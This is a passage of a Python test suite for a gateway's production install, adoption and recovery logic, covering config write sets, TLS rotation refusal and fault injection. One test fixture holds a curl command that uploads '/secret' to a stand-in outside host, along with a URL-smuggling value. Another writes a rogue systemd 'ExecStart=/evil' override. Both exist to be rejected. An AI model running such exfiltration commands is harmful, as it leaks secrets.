            old, new = self.home / 'config/runtime' / relative, staged / relative
            changes.append({'path': relative,
                            'before': self.g.production_pin(old) if old.exists() else None,
                            'after': self.g.production_pin(new) if new.exists() else None})
        self.approval.update(transaction='V2_CONFIG', candidate=candidate,
                             configWriteSet=changes)
        self.payload.chmod(0o700)
        return self.args(), previous

    def assert_v2_tls_change_refused(self, with_tls):
        _, previous = self.v2_config_release(with_tls=with_tls)
        staged = self.payload / 'config/runtime'
        tls = staged / 'tls/ca.crt'
        self.write(tls, b'PRIVATE FIXTURE CA V2\n', 0o600)
        candidate = self.approval['candidate']
        candidate['configSha256'] = self.m.tree_hashes(staged)
        protected = copy.deepcopy(previous['roleAuthority']['resolved']['protected'])
        protected['tlsSha256'] = {'tls/ca.crt': candidate['configSha256']['tls/ca.crt']}
        policy = {'__name__': 'private_v2_policy'}
        parser = (REPO / 'deploy/production_role_policy.py').read_bytes()
        exec(compile(parser, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        candidate['roleAuthority']['resolved'] = policy['resolve'](
            staged, self.path('/etc/systemd/system'), protected,
            self.path('/etc/modbus-gateway/ota.pub'))
        self.approval['configWriteSet'].append({
            'path': 'tls/ca.crt',
            'before': self.g.production_pin(self.home / 'config/runtime/tls/ca.crt')
                      if with_tls else None,
            'after': self.g.production_pin(tls)})
        args = self.args()
        with self.assertRaisesRegex(ValueError, 'cannot rotate network/TLS trust'):
            with self.m.production_lock():
                self.m.production_install(args)
        self.assertFalse((self.runtime.root / 'transactions/V2_CONFIG').exists())
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_ordinary_approval_rejects_self_consistent_tls_addition(self):
        self.assert_v2_tls_change_refused(with_tls=False)

    def test_v2_ordinary_approval_rejects_self_consistent_tls_rotation(self):
        self.assert_v2_tls_change_refused(with_tls=True)

    def test_v2_config_payload_private_root_and_unchanged_tls_mode(self):
        args, previous = self.v2_config_release(with_tls=True)
        self.payload.chmod(0o755)
        with self.assertRaisesRegex(ValueError, 'payload root must be private'):
            with self.m.production_lock():
                self.m.production_install(args)
        self.payload.chmod(0o700)
        (self.payload / 'config/runtime/tls/ca.crt').chmod(0o644)
        with self.assertRaisesRegex(ValueError, 'unchanged production config payload metadata drift'):
            with self.m.production_lock():
                self.m.production_install(args)
        self.assertFalse((self.runtime.root / 'transactions/V2_CONFIG').exists())
        self.assertEqual(self.g.production_context(self.home), previous)

    def assert_untrusted_config_directory_preintent(self, relative, mode=0o775):
        args, previous = self.v2_config_release()
        directory = self.home / 'config/runtime' / relative
        directory.mkdir(exist_ok=True)
        directory.chmod(mode)
        before = (self.home / 'bin/SystemMonitor').read_bytes()
        call_count = len(self.calls)
        self.fail_health = True
        with self.assertRaisesRegex(ValueError, 'unowned production config directory'):
            with self.m.production_lock():
                self.m.production_install(args)
        self.assertFalse((self.runtime.root / 'transactions/V2_CONFIG').exists())
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), before)
        self.assertEqual(directory.stat().st_mode & 0o777, mode)
        self.assertFalse(any(call[0] == 'stop' for call in self.calls[call_count:]))
        directory.chmod(0o755)
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_unrelated_config_directory_rejected_before_intent(self):
        self.assert_untrusted_config_directory_preintent('devices')

    def test_v2_changed_config_parent_rejected_before_intent(self):
        self.assert_untrusted_config_directory_preintent('apps')

    def test_v2_unapproved_empty_config_directory_rejected_before_intent(self):
        self.assert_untrusted_config_directory_preintent('unapproved', 0o755)

    def test_v2_code_only_trusted_config_directories_install(self):
        args, previous = self.v2_code_only_release()
        self.assertEqual(self.approval['configWriteSet'], [])
        self.assertEqual(self.approval['candidate']['configSha256'], previous['configSha256'])
        with self.m.production_lock():
            transaction = self.m.production_install(args)
        self.assertEqual(self.g.production_json(transaction / 'state.json')['phase'], 'COMPLETED')
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'V2_NEXT')

    def test_v2_code_only_untrusted_config_directory_rejected_before_intent(self):
        args, previous = self.v2_code_only_release()
        directory = self.home / 'config/runtime/devices'
        directory.mkdir()
        directory.chmod(0o775)
        before = (self.home / 'bin/SystemMonitor').read_bytes()
        call_count = len(self.calls)
        with self.assertRaisesRegex(ValueError, 'unowned production config directory'):
            with self.m.production_lock():
                self.m.production_install(args)
        self.assertFalse((self.runtime.root / 'transactions/V2_CODE_ONLY').exists())
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), before)
        self.assertFalse(any(call[0] == 'stop' for call in self.calls[call_count:]))
        directory.chmod(0o755)
        self.assertEqual(self.g.production_context(self.home), previous)

    def v2_app_only_after_empty_logic(self, transaction):
        previous = copy.deepcopy(self.g.production_context(self.home))
        self.assertTrue((self.home / 'config/runtime/logic').is_dir())
        self.assertFalse(any((self.home / 'config/runtime/logic').iterdir()))
        staged = self.payload / 'config/runtime'
        stale = staged / 'logic/new.json'
        if stale.exists():
            stale.unlink()
        live = self.home / 'config/runtime/apps/monitor-service.json'
        value = json.loads(live.read_text())
        app = staged / 'apps/monitor-service.json'
        self.write(app, json.dumps(value, sort_keys=True, indent=2) + '\n')
        self.assertNotEqual(app.read_bytes(), live.read_bytes())
        candidate = copy.deepcopy(previous)
        candidate.update(baselineId=transaction, generation=previous['generation'] + 1,
                         parentSha256=self.g.production_json(self.runtime.root / 'current.json')['sha256'],
                         release='v2-app-only', files=self.g.production_files(self.payload),
                         configSha256=self.m.tree_hashes(staged))
        policy = {'__name__': 'private_v2_policy'}
        parser = (REPO / 'deploy/production_role_policy.py').read_bytes()
        exec(compile(parser, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        candidate['roleAuthority']['resolved'] = policy['resolve'](
            staged, self.path('/etc/systemd/system'),
            previous['roleAuthority']['resolved']['protected'],
            self.path('/etc/modbus-gateway/ota.pub'))
        self.approval.update(transaction=transaction, previous=previous,
                             parentSha256=candidate['parentSha256'], candidate=candidate,
                             configWriteSet=[{'path': 'apps/monitor-service.json',
                                              'before': self.g.production_pin(live),
                                              'after': self.g.production_pin(app)}])
        return self.args(), previous

    def test_v2_empty_logic_after_completed_deletion_allows_next_app_recovery(self):
        args, _ = self.v2_config_release()
        staged = self.payload / 'config/runtime'
        (staged / 'logic/new.json').unlink()
        candidate = self.approval['candidate']
        candidate['configSha256'] = self.m.tree_hashes(staged)
        policy = {'__name__': 'private_v2_policy'}
        parser = (REPO / 'deploy/production_role_policy.py').read_bytes()
        exec(compile(parser, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        candidate['roleAuthority']['resolved'] = policy['resolve'](
            staged, self.path('/etc/systemd/system'),
            self.approval['previous']['roleAuthority']['resolved']['protected'],
            self.path('/etc/modbus-gateway/ota.pub'))
        self.approval['configWriteSet'] = [row for row in self.approval['configWriteSet']
                                            if row['path'] != 'logic/new.json']
        with self.m.production_lock():
            self.m.production_install(self.args())
        second, previous = self.v2_app_only_after_empty_logic('V2_AFTER_DELETE')
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock():
                self.m.production_install(second)
        self.fail_start = False
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(
                self.runtime.root / 'transactions/V2_AFTER_DELETE',
                second.approval_sha256), 'RECOVERED')
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_empty_logic_after_failed_addition_allows_next_app_recovery(self):
        args, _ = self.v2_config_release(without_logic_parent=True)
        root = self.home / 'config/runtime'
        sync = self.m.sync_dir
        fired = []
        def fail_new_parent(path):
            if path == root and (root / 'logic').is_dir() and not fired:
                fired.append(path)
                raise OSError('injected after approved directory creation')
            return sync(path)
        with mock.patch.object(self.m, 'sync_dir', fail_new_parent):
            with self.assertRaisesRegex(OSError, 'approved directory creation'):
                with self.m.production_lock():
                    self.m.production_install(args)
        self.assertEqual(fired, [root])
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(
                self.runtime.root / 'transactions/V2_CONFIG', args.approval_sha256), 'RECOVERED')
        second, previous = self.v2_app_only_after_empty_logic('V2_AFTER_ABORT')
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock():
                self.m.production_install(second)
        self.fail_start = False
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(
                self.runtime.root / 'transactions/V2_AFTER_ABORT',
                second.approval_sha256), 'RECOVERED')
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_strict_umask_interrupted_config_copy_recovers_owned_temp(self):
        args, previous = self.v2_config_release()
        temp = self.runtime.copy_name(
            self.runtime.root / 'transactions/V2_CONFIG',
            'config/runtime/apps/monitor-service.json', 'install')
        original = os.fchmod
        fired = []
        def fail_before_mode(fd, mode):
            if os.readlink('/proc/self/fd/' + str(fd)) == str(temp) and not fired:
                fired.append(mode)
                raise OSError('injected before config staging chmod')
            return original(fd, mode)
        saved_umask = os.umask(0o077)
        try:
            with mock.patch.object(self.m.os, 'fchmod', side_effect=fail_before_mode):
                with self.assertRaisesRegex(OSError, 'config staging chmod'):
                    with self.m.production_lock():
                        self.m.production_install(args)
        finally:
            os.umask(saved_umask)
        self.assertEqual(fired, [0o644])
        self.assertEqual(temp.stat().st_mode & 0o777, 0o600)
        tx = self.runtime.root / 'transactions/V2_CONFIG'
        previous_files = sorted(previous['files'].items())
        for index, (_, pin) in enumerate(previous_files):
            self.assertEqual(self.g.production_pin(tx / 'files' / str(index)), pin)
        for unit, path in previous['gates'].items():
            self.assertEqual(self.g.production_pin(Path(path)),
                             self.approval['candidate']['unitFiles'][path], unit)
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(
                tx, args.approval_sha256), 'RECOVERED')
        self.assertFalse(temp.exists())
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_config_add_delete_replace_install_and_promotion(self):
        args, _ = self.v2_config_release()
        with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'V2_CONFIG')
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'),
                         self.approval['candidate']['configSha256'])
        self.assertFalse((self.runtime.root / 'pending.json').exists())

    def test_v2_deleted_logic_requires_new_approved_write_set_to_restore(self):
        args, _ = self.v2_config_release()
        retired = self.home / 'config/runtime/logic/retired.json'
        old_bytes = retired.read_bytes()
        with self.m.production_lock():
            self.m.production_install(args)
        self.assertFalse(retired.exists())
        previous = copy.deepcopy(self.g.production_context(self.home))
        pointer = self.g.production_json(self.runtime.root / 'current.json')
        staged = self.payload / 'config/runtime'
        self.write(staged / 'logic/retired.json', old_bytes)
        candidate = copy.deepcopy(previous)
        candidate.update(baselineId='V2_LOGIC_RESTORE',
                         generation=previous['generation'] + 1,
                         parentSha256=pointer['sha256'], release='v2-logic-restore',
                         configSha256=self.m.tree_hashes(staged))
        policy = {'__name__': 'private_v2_policy'}
        parser = self.payload / 'bin/production_role_policy.py'
        exec(compile(parser.read_bytes(), str(parser), 'exec'), policy)
        candidate['roleAuthority']['resolved'] = policy['resolve'](
            staged, self.path('/etc/systemd/system'),
            previous['roleAuthority']['resolved']['protected'],
            self.path('/etc/modbus-gateway/ota.pub'))
        self.approval.update(transaction='V2_LOGIC_RESTORE', previous=previous,
                             candidate=candidate, parentSha256=pointer['sha256'],
                             configWriteSet=[])
        missing_set = self.args()
        with self.assertRaisesRegex(ValueError, 'write set incomplete'):
            with self.m.production_lock():
                self.m.production_install(missing_set)
        self.assertFalse((self.runtime.root / 'transactions/V2_LOGIC_RESTORE').exists())
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.approval['configWriteSet'] = [{
            'path': 'logic/retired.json', 'before': None,
            'after': self.g.production_pin(staged / 'logic/retired.json')}]
        approved = self.args()
        with self.m.production_lock():
            self.m.production_install(approved)
        self.assertEqual(retired.read_bytes(), old_bytes)
        self.assertEqual(self.g.production_context(self.home), candidate)
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'), candidate['configSha256'])
        self.assertFalse((self.runtime.root / 'pending.json').exists())

    def test_v2_config_mixed_state_restores_approved_old_write_set(self):
        args, previous = self.v2_config_release()
        old = {relative: (self.home / 'config/runtime' / relative).read_bytes()
               for relative in previous['configSha256']}
        copy = self.m.production_copy
        fired = []
        def fail_after_first_config(source, destination, pin, **kwargs):
            result = copy(source, destination, pin, **kwargs)
            if destination == self.home / 'config/runtime/apps/monitor-service.json' and not fired:
                fired.append(destination)
                raise OSError('injected config copy completion fault')
            return result
        with mock.patch.object(self.m, 'production_copy', fail_after_first_config):
            with self.assertRaisesRegex(OSError, 'config copy completion fault'):
                with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(len(fired), 1)
        tx = self.runtime.root / 'transactions/V2_CONFIG'
        for phase, content in (('install', b'{"run'), ('recover', b'{"pre')):
            temporary = self.runtime.copy_name(tx,
                        'config/runtime/apps/monitor-service.json', phase)
            self.write(temporary, content)
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertGreaterEqual(len(list((tx / 'interrupted-copies').iterdir())), 2)
        self.assertEqual(self.g.production_context(self.home), previous)
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'),
                         previous['configSha256'])
        for relative, content in old.items():
            self.assertEqual((self.home / 'config/runtime' / relative).read_bytes(), content)
        self.assertFalse((self.home / 'config/runtime/logic/new.json').exists())

    def test_v2_config_recovery_refuses_foreign_temp_before_restoring(self):
        args, _ = self.v2_config_release()
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock(): self.m.production_install(args)
        foreign = self.home / 'config/runtime/logic/.foreign.production-V2_CONFIG-install'
        self.write(foreign, b'not an owned temporary file')
        self.fail_start = False
        parser = (self.home / 'bin/production_role_policy.py').read_bytes()
        tx = self.runtime.root / 'transactions/V2_CONFIG'
        with self.assertRaisesRegex(ValueError, 'unowned production config inventory'):
            with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(foreign.read_bytes(), b'not an owned temporary file')
        self.assertEqual((self.home / 'bin/production_role_policy.py').read_bytes(), parser)

    def test_v2_config_completed_addition_then_fault_restores_absence(self):
        args, previous = self.v2_config_release()
        copy = self.m.production_copy
        fired = []
        def fail_after_add(source, destination, pin, **kwargs):
            result = copy(source, destination, pin, **kwargs)
            if destination == self.home / 'config/runtime/logic/new.json' and not fired:
                fired.append(destination)
                raise OSError('injected after approved addition')
            return result
        with mock.patch.object(self.m, 'production_copy', fail_after_add):
            with self.assertRaisesRegex(OSError, 'after approved addition'):
                with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(len(fired), 1)
        self.assertTrue((self.home / 'config/runtime/logic/new.json').is_file())
        self.assertTrue((self.home / 'config/runtime/logic/retired.json').is_file())
        tx = self.runtime.root / 'transactions/V2_CONFIG'
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'), previous['configSha256'])
        self.assertFalse((self.home / 'config/runtime/logic/new.json').exists())

    def test_v2_config_completed_deletion_then_fault_restores_old_file(self):
        args, previous = self.v2_config_release()
        sync = self.m.sync_dir
        retired = self.home / 'config/runtime/logic/retired.json'
        old = retired.read_bytes()
        fired = []
        def fail_after_delete(path):
            result = sync(path)
            if path == retired.parent and not retired.exists() and not fired:
                fired.append(path)
                raise OSError('injected after approved deletion')
            return result
        with mock.patch.object(self.m, 'sync_dir', fail_after_delete):
            with self.assertRaisesRegex(OSError, 'after approved deletion'):
                with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(len(fired), 1)
        self.assertFalse(retired.exists())
        self.assertTrue((retired.parent / 'new.json').is_file())
        tx = self.runtime.root / 'transactions/V2_CONFIG'
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual(retired.read_bytes(), old)
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'), previous['configSha256'])

    def test_v2_new_config_parent_sync_failure_stays_pending_and_recovers(self):
        args, previous = self.v2_config_release(without_logic_parent=True)
        config_root = self.home / 'config/runtime'
        self.assertFalse((config_root / 'logic').exists())
        sync = self.m.sync_dir
        fired = []
        def fail_parent_binding(path):
            if path == config_root and (config_root / 'logic').is_dir() and not fired:
                fired.append(path)
                raise OSError('injected config parent sync failure')
            return sync(path)
        with mock.patch.object(self.m, 'sync_dir', fail_parent_binding):
            with self.assertRaisesRegex(OSError, 'config parent sync failure'):
                with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(len(fired), 1)
        self.assertTrue((self.runtime.root / 'pending.json').is_file())
        self.assertEqual(self.g.production_json(self.runtime.root / 'current.json')['baselineId'],
                         'V2_START')
        self.assertFalse((config_root / 'logic/new.json').exists())
        with self.assertRaisesRegex(ValueError, 'unresolved production install'):
            self.g.production_unit(self.home, 'gateway-services.service')
        tx = self.runtime.root / 'transactions/V2_CONFIG'
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual(self.m.tree_hashes(config_root), previous['configSha256'])
        self.assertTrue((config_root / 'logic').is_dir())
        self.approval['transaction'] = 'V2_CONFIG_RETRY'
        self.approval['candidate']['baselineId'] = 'V2_CONFIG_RETRY'
        retry = self.args()
        sync, copy = self.m.sync_dir, self.m.production_copy
        events = []
        def observe_sync(path):
            if path == config_root:
                events.append('root-sync')
            return sync(path)
        def observe_copy(source, destination, pin, **kwargs):
            if destination == config_root / 'logic/new.json':
                self.assertTrue(events and events[-1] == 'root-sync')
                events.append('logic-copy')
            return copy(source, destination, pin, **kwargs)
        with mock.patch.object(self.m, 'sync_dir', observe_sync), \
             mock.patch.object(self.m, 'production_copy', observe_copy):
            with self.m.production_lock(): self.m.production_install(retry)
        self.assertIn('logic-copy', events)
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'V2_CONFIG_RETRY')

    def add_factory_stage_to_candidate(self):
        name = 'factory-lifecycle-stage.py'
        source = REPO / 'deploy' / name
        live = self.home / 'bin' / name
        if live.exists():
            live.unlink()
        self.previous['files'].pop('bin/' + name, None)
        self.write(self.payload / 'bin' / name, source.read_bytes(), 0o755)
        self.candidate['files']['bin/' + name] = self.g.production_pin(self.payload / 'bin' / name)

    def test_production_entry_exists_without_changing_legacy_actions(self):
        module = load()
        self.assertTrue(callable(getattr(module, 'production_adopt', None)),
                        'formal production adoption is missing')
        self.assertTrue(callable(getattr(module, 'production_install', None)))
        self.assertTrue(callable(getattr(module, 'production_recover', None)))
        for action in ('apply', 'recover', 'observe', 'activate'):
            self.assertTrue(callable(getattr(module, action)))

    def test_adopt_changed_same_abi_install_health_promotion(self):
        tx, _ = self.adopt()
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')
        args = self.next_release()
        with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B1')
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.assertEqual(self.path('/dev/shm/live_v11').stat().st_ino, self.original_inode)
        self.assertTrue((tx / 'health.json').exists())

    def test_adopt_introduces_exact_factory_stage_from_legacy_inventory(self):
        self.add_factory_stage_to_candidate()
        self.assertNotIn('bin/factory-lifecycle-stage.py', self.previous['files'])
        self.assertFalse((self.home / 'bin/factory-lifecycle-stage.py').exists())
        self.adopt()
        self.assertEqual(self.g.production_pin(self.home / 'bin/factory-lifecycle-stage.py'),
                         self.candidate['files']['bin/factory-lifecycle-stage.py'])
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')

    def test_failed_factory_stage_adoption_recovers_legacy_absence(self):
        self.add_factory_stage_to_candidate()
        self.fail_health = True
        args = self.args()
        with self.assertRaisesRegex(ValueError, 'endpoint health'):
            with self.m.production_lock(): self.m.production_adopt(args)
        self.assertTrue((self.home / 'bin/factory-lifecycle-stage.py').exists())
        self.fail_health = False
        transaction = self.runtime.root / 'transactions/ADOPT_01'
        with self.m.production_lock():
            self.assertEqual('RECOVERED', self.runtime.recover(transaction, args.approval_sha256))
        self.assertFalse((self.home / 'bin/factory-lifecycle-stage.py').exists())
        self.assertEqual(self.g.production_files(self.home), self.previous['files'])
        self.assertEqual('RECOVERED', self.g.production_json(transaction / 'state.json')['phase'])
        self.assertFalse((self.runtime.root / 'pending.json').exists())

    def test_adoption_rejects_unapproved_or_unpinned_factory_stage_before_intent(self):
        self.add_factory_stage_to_candidate()
        self.write(self.payload / 'bin/unapproved-helper.py', b'unknown helper\n', 0o755)
        self.candidate['files']['bin/unapproved-helper.py'] = self.g.production_pin(
            self.payload / 'bin/unapproved-helper.py')
        with self.assertRaisesRegex(ValueError, 'paired inventory expansion'):
            self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))
        del self.candidate['files']['bin/unapproved-helper.py']
        (self.payload / 'bin/unapproved-helper.py').unlink()
        (self.payload / 'bin/factory-lifecycle-stage.py').write_bytes(b'changed after pin\n')
        with self.assertRaisesRegex(ValueError, 'production payload pin mismatch'):
            self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))

    def test_adoption_rejects_preexisting_factory_stage_without_replacing_it(self):
        self.add_factory_stage_to_candidate()
        live = self.home / 'bin/factory-lifecycle-stage.py'
        self.write(live, b'foreign stage\n', 0o755)
        with self.assertRaisesRegex(ValueError, 'unexpected introduced production helper'):
            self.adopt()
        self.assertEqual(live.read_bytes(), b'foreign stage\n')
        self.assertFalse(self.runtime.root.exists())

    def test_adoption_rejects_unsafe_factory_stage_type_or_mode(self):
        self.add_factory_stage_to_candidate()
        stage = self.payload / 'bin/factory-lifecycle-stage.py'
        stage.chmod(0o777)
        with self.assertRaisesRegex(ValueError, 'untrusted production file'):
            self.adopt()
        self.assertFalse(self.runtime.root.exists())
        stage.unlink()
        stage.symlink_to(REPO / 'deploy/factory-lifecycle-stage.py')
        with self.assertRaisesRegex(ValueError, 'symlink production payload'):
            self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))

    def test_failed_health_recovers_code_gates_pointer_not_mutable_data(self):
        self.adopt()
        old = (self.home / 'bin/SystemMonitor').read_bytes()
        args = self.next_release()
        self.fail_health = True
        with self.assertRaisesRegex(ValueError, 'endpoint health'):
            with self.m.production_lock(): self.m.production_install(args)
        with self.path('/dev/shm/live_v11').open('r+b') as f:
            f.seek(4096); f.write(b'NEW MUTABLE BUSINESS DATA')
        self.fail_health = False
        tx = self.runtime.root / 'transactions/INSTALL_02'
        with self.m.production_lock(): result = self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(result, 'RECOVERED')
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), old)
        with self.path('/dev/shm/live_v11').open('rb') as f:
            f.seek(4096); self.assertEqual(f.read(25), b'NEW MUTABLE BUSINESS DATA')
        self.assertEqual(self.path('/dev/shm/live_v11').stat().st_ino, self.original_inode)

    def test_invalid_parent_expiry_config_or_architecture_zero_mutation(self):
        for field, value in [('expiresAtUnix', 0), ('machineCode', 'FOREIGN')]:
            original = self.approval[field]
            self.approval[field] = value
            with self.assertRaises(ValueError): self.adopt()
            self.assertFalse(self.runtime.root.exists())
            self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))
            self.approval[field] = original

    def test_nested_qt_library_preserved_and_unsafe_paths_denied(self):
        self.g.production_schema(self.candidate, self.home)
        for path in ('ky-ems/../outside', '/bin/outside', 'ky-ems/plugins/./x', 'bin//x'):
            bad = copy.deepcopy(self.candidate)
            bad['files'][path] = bad['files']['bin/SystemMonitor']
            with self.assertRaises(ValueError): self.g.production_schema(bad, self.home)

    def test_payload_wrong_elf_architecture_denies_before_any_intent(self):
        path = self.payload / 'bin/SystemMonitor'
        header = bytearray(path.read_bytes())
        struct.pack_into('<H', header, 18, 62)
        self.write(path, header, 0o755)
        self.candidate['files']['bin/SystemMonitor'] = self.g.production_pin(path)
        with self.assertRaisesRegex(ValueError, 'ELF architecture mismatch'):
            self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))

    def test_boot_malformed_pending_ref_denies_before_recovery_or_mutation(self):
        self.adopt()
        pending = self.runtime.root / 'pending.json'
        for value in ([], {'transaction': '../outside', 'approvalSha256': '1' * 64},
                      {'transaction': 'ADOPT_01'}, {'transaction': 'ADOPT_01', 'approvalSha256': False},
                      {'transaction': 'ADOPT_01', 'approvalSha256': '1' * 64}):
            self.write(pending, json.dumps(value), 0o600)
            before = pending.read_bytes()
            self.calls.clear()
            with self.assertRaisesRegex(ValueError, 'production boot'):
                self.m.production_boot(types.SimpleNamespace(home=self.home))
            self.assertEqual(pending.read_bytes(), before)
            self.assertFalse(self.calls)

    def test_arbitrary_curl_argv_or_url_options_are_not_a_policy(self):
        for policy in ({'stableSeconds': 2, 'endpointArgv': ['/usr/bin/curl', '--upload-file', '/secret',
                        'https://outside.invalid/collect', '--fail', '--max-time', '3', 'http://127.0.0.1:8080/health']},
                       {'stableSeconds': 2, 'timeoutSeconds': 3, 'url': 'http://127.0.0.1:8080/a https://outside.invalid'},
                       {'stableSeconds': 2, 'timeoutSeconds': True, 'url': 'http://127.0.0.1:8080/health'}):
            bad = copy.deepcopy(self.candidate); bad['healthPolicy'] = policy
            with self.assertRaises(ValueError): self.g.production_schema(bad, self.home)

    def test_controller_start_rejected_and_inventory_kept(self):
        self.adopt()
        with self.assertRaisesRegex(ValueError, 'controller/unapproved'):
            self.g.production_unit(self.home, 'ky-ems.service')
        self.assertIn('ky-ems/plugins/platforms/libqeglfs.so', self.g.production_context(self.home)['files'])

    def test_historical_drift_and_unknown_unit_or_override_refuse_before_stop(self):
        self.write(self.root / 'historical/state.json', '{"drift":true}\n', 0o600)
        with self.assertRaises(ValueError): self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.write(self.root / 'historical/state.json', json.dumps({'segments': [{'source': 'retired_v10', 'target': 'live_v11'}]}) + '\n', 0o600)
        override = self.path('/etc/systemd/system/system-monitor@.service.d/evil.conf')
        self.write(override, '[Service]\nExecStart=/evil\n')
        with self.assertRaisesRegex(ValueError, 'unit/override drift'): self.adopt()
        self.assertFalse(self.runtime.root.exists())

    def test_symlink_payload_or_installed_file_rejects(self):
        p = self.payload / 'ky-ems/plugins/platforms/libqeglfs.so'
        p.unlink(); p.symlink_to(self.home / 'ky-ems/plugins/platforms/libqeglfs.so')
        with self.assertRaisesRegex(ValueError, 'symlink production payload'): self.adopt()
        self.assertFalse(self.runtime.root.exists())

    def test_terminal_write_failure_reconciles_promoted_not_rollback(self):
        original = self.runtime.state
        def fail_completed(tx, value):
            if value['phase'] == 'COMPLETED': raise OSError('injected final journal write')
            return original(tx, value)
        args = self.args()
        with mock.patch.object(self.m.ProductionRuntime, 'state', lambda owner, tx, value: fail_completed(tx, value)):
            with self.assertRaisesRegex(OSError, 'final journal'):
                with self.m.production_lock(): self.m.production_adopt(args)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        installed = (self.home / 'bin/SystemMonitor').read_bytes()
        with self.m.production_lock(): self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'COMPLETED')
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), installed)
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')

    def test_duplicate_adoption_is_consumed(self):
        self.adopt()
        self.calls.clear()
        with self.assertRaisesRegex(ValueError, 'consumed'): self.adopt()
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))

    def test_malformed_pointer_and_pending_ref_deny_before_path_join(self):
        self.adopt()
        pointer = self.runtime.root / 'current.json'
        original = pointer.read_bytes()
        for field, value in [('transaction', '../../outside'), ('transaction', []), ('sha256', 7), ('baselineId', None)]:
            data = json.loads(original); data[field] = value
            self.write(pointer, json.dumps(data), 0o600)
            with self.assertRaises(ValueError): self.g.production_context(self.home)
        self.write(pointer, original, 0o600)
        for data in ({'transaction': '../outside', 'approvalSha256': '1' * 64}, [],
                     {'transaction': 'T', 'approvalSha256': False}, {'transaction': 'T'}):
            self.write(self.runtime.root / 'pending.json', json.dumps(data), 0o600)
            with self.assertRaises(ValueError): self.g.production_unit(self.home, self.g.MONITOR_UNIT)

    def test_schema_field_types_and_duplicate_json_deny(self):
        for key, value in [('units', {}), ('files', []), ('segments', None), ('healthPolicy', []), ('historical', None)]:
            bad = copy.deepcopy(self.candidate); bad[key] = value
            with self.assertRaises(ValueError): self.g.production_schema(bad, self.home)
        path = self.root / 'duplicate.json'
        self.write(path, '{"transaction":"A","transaction":"B"}', 0o600)
        with self.assertRaisesRegex(ValueError, 'duplicate'): self.g.production_json(path)

    def test_new_boot_or_replaced_v11_refuses_before_mutation(self):
        self.write(self.path('/proc/sys/kernel/random/boot_id'), 'NEW_BOOT\n')
        with self.assertRaisesRegex(ValueError, 'retired source recreated'): self.adopt()
        self.assertFalse(self.runtime.root.exists())

    def test_pretty_approval_survives_failed_install_and_real_recovery(self):
        path = self.root / 'pretty-approval.json'
        raw = (json.dumps(self.approval, indent=4) + '\n').encode()
        self.write(path, raw, 0o600)
        args = types.SimpleNamespace(approval=path, approval_sha256=self.m.digest(path), payload=self.payload)
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock(): self.m.production_adopt(args)
